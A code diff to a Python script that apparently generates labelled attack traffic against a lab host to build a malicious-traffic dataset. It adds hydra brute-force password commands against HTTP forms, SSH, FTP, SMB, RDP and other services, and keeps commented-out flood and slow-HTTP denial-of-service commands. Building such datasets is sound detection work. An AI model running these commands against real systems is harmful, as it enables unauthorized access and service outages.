@@ -9,6 +9,21 @@ CSV_FILE = os.path.join(repo_path, "./data/df/df_malign_captured_cleaned.csv")
 LINES_PER_COMMAND = 100
 
 target_ip = "192.168.1.178"
+pass_list = os.getenv('ROCKYOU_PATH')
+
+commands = [
+    f"hydra -l admin -P {pass_list} {target_ip} http-post-form '/index.php:user=^USER^&pass=^PASS^:F=Login failed' -t 64 -f",    
+    f"hydra -l root -P {pass_list} {target_ip} ssh -t 22 -f",    
+    f"hydra -l user -P {pass_list} {target_ip} ftp -t 40 -vV",    
+    f"hydra -l admin -P {pass_list} {target_ip} telnet -t 32 -f",    
+    f"hydra -l administrator -P {pass_list} {target_ip} smb -t 16",    
+    f"hydra -l guest -P {pass_list} {target_ip} http-get /admin -t 32",    
+    f"hydra -l root -P {pass_list} {target_ip} mysql -t 10 -f",    
+    f"hydra -l admin -P {pass_list} {target_ip} rdp -t 4 -W 5", 
+    f"hydra -l support -P {pass_list} {target_ip} -s 2222 ssh -t 32",    
+    f"hydra -L users.txt -P {pass_list} {target_ip} http-post-form '/index.php:username=^USER^&password=^PASS^:S=Welcome' -t 128"
+]
+
 '''
 commands = [
     f"python3 goldeneye.py {target_ip} -w 50 -s 30 -m get",
@@ -35,7 +50,7 @@ commands = [
     f"slowhttptest -c 1000 -H -r 300 -u {target_ip}/index.php",
     f"slowhttptest -c 600 -B -i 50 -u {target_ip}"
 ]
-'''
+
 commands = [
     f"sudo hping3 -S --flood -V -p 80 {target_ip}",
     f"sudo hping3 --udp --flood -V -p 53 {target_ip}", 
@@ -48,6 +63,7 @@ commands = [
     f"sudo hping3 --xmas --flood -p 80 {target_ip}",
     f"sudo hping3 -S -A -F -R --flood -p 80 {target_ip}" 
 ]
+'''
 
 def count_lines(file_path):
     """Cuenta líneas del CSV de forma segura."""
